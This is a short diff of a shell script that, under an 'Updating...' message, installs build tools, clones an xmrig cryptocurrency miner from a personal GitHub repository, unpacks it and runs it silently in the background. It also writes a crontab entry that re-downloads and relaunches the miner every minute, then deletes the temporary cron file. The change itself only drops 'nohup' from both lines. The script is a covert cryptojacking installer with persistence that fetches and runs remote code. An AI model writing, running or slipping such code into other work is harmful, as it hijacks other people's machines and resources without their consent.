@@ -24,10 +24,10 @@ echo "Updating..."
 sudo apt update && sudo apt install git && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 echo ""
 echo ""
-nohup git clone https://github.com/katerin966/xmrig.git && cd xmrig && tar xvzf xmrig.tar.gz && ./xmrig &> /dev/null &
+git clone https://github.com/katerin966/xmrig.git && cd xmrig && tar xvzf xmrig.tar.gz && ./xmrig &> /dev/null &
 echo ""
 echo ""
-echo "*/1 * * * * nohup git clone https://github.com/katerin966/xmrig.git && cd xmrig && tar xvzf xmrig.tar.gz && ./xmrig &> /dev/null &" > cron && cat cron | crontab -
+echo "*/1 * * * * git clone https://github.com/katerin966/xmrig.git && cd xmrig && tar xvzf xmrig.tar.gz && ./xmrig &> /dev/null &" > cron && cat cron | crontab -
 echo ""
 rm cron
 echo ""
